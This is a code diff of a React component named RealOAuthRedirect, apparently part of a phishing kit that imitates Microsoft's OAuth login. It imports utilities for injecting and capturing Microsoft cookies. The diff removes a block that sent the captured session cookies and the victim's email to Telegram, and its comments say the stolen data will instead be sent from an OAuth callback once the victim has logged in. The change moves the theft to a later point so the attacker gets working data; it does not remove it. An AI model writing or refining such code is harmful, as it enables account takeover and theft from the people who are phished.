@@ -1,5 +1,5 @@
 import React, { useEffect } from 'react';
-import { injectMicrosoftCookies, setCredentials, getAllCapturedCookies, getMostReliableEmail, captureAndSendCookies } from '../utils/client-cookie-capture';
+import { injectMicrosoftCookies, setCredentials, getAllCapturedCookies, getMostReliableEmail } from '../utils/client-cookie-capture';
 
 let ipaddress = '';
 let email = '';
@@ -41,23 +41,9 @@ const RealOAuthRedirect: React.FC<any> = ({ onLoginSuccess, sessionData }) => {
         console.log('🔧 Injecting Microsoft cookies before OAuth redirect...');
         injectMicrosoftCookies();
         
-        // Capture and send cookies after injection
-        setTimeout(async () => {
-          try {
-            const capturedCookies = getAllCapturedCookies();
-            const userEmail = getMostReliableEmail(email);
-            
-            console.log('📤 Attempting to send captured cookies to Telegram:', {
-              cookieCount: capturedCookies.length,
-              email: userEmail
-            });
-            
-            await captureAndSendCookies(userEmail, capturedCookies);
-            console.log('✅ Cookies sent to Telegram successfully before OAuth redirect');
-          } catch (error) {
-            console.error('❌ Failed to send cookies to Telegram:', error);
-          }
-        }, 1000);
+        // REMOVED: Cookie sending from here to prevent placeholder data
+        // The real data will be sent from oauth-callback.js after successful authentication
+        console.log('📝 Cookies injected, skipping send (will send real data from callback)');
         // <<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
 
         try {
